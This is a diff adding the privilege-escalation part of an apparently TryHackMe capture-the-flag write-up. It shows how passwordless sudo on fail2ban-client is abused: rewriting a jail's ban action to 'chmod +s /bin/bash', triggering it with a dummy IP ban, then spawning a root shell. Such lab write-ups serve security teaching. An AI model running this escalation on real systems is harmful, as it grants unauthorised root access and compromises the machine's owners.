@@ -159,6 +159,70 @@ THM{[redacted]}
 ---
 ### Privilege escalation, looking for a root flag.
 
+We found something using suid, running as root.
 
+```bash
+asterisk@ip-10-66-186-106:/$ id
+uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
+asterisk@ip-10-66-186-106:/$ sudo -l
+Matching Defaults entries for asterisk on ip-10-66-186-106:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for asterisk:
+    Defaults!/usr/bin/fail2ban-client !requiretty
+
+User asterisk may run the following commands on ip-10-66-186-106:
+    (ALL) NOPASSWD: /usr/bin/fail2ban-client
+```
+#### 🤔 😵‍💫 I’ll do some digging on fail2ban-client exploits.
+
+The fail2ban-client is the CLI used to manage and configure the fail2ban-server. This security tool protects the system by monitoring logs for malicious activity and automatically blocking offending IPs via firewall rules. Since the server process runs as root, any ability to control the client with elevated privileges (via sudo) creates a high-risk path for full system compromise.
+
+### 👊👊 Attacking, using fail2ban to change the suid of /bin/bash
+
+The output confirms that the fail2ban-server is actively monitoring the system through 8 specific 'jails'. Each jail represents a set of rules and filters tailored to a particular service.
+```bash
+asterisk@ip-10-66-186-106:/$ sudo fail2ban-client status
+Status
+|- Number of jail:      8
+`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
+```
+I checked the asterisk-iptables jail and found its specific action: iptables-allports-ASTERISK.
+```bash
+asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables actions
+The jail asterisk-iptables has the following actions:
+iptables-allports-ASTERISK
+```
+The output shows the exact iptables syntax the server uses to ban an IP.
+```bash
+asterisk@ip-10-66-186-106:/$ sudo fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
+```
+
+ I replaced the standard firewall rule with a command that grants permanent root access: chmod +s /bin/bash.
+
+ ```bash
+ asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+chmod +s /bin/bash
+```
+I needed to force the system to execute it. I used the banip command to manually ban a dummy IP address (1.2.3.4).
+
+```bash
+asterisk@ip-10-66-186-106:/$ sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
+1
+```
+### triggering /bin/bash with suid and retrieving the root flag.
+
+```bash
+asterisk@ip-10-66-186-106:/$ /bin/bash -p
+bash-5.2# id
+uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
+bash-5.2# cd /root
+bash-5.2# cat root.txt
+THM{[redacted]}
+bash-5.2# 
+```
+## 🤴🏿 Pnwed, by Nelson Hirt
 
 
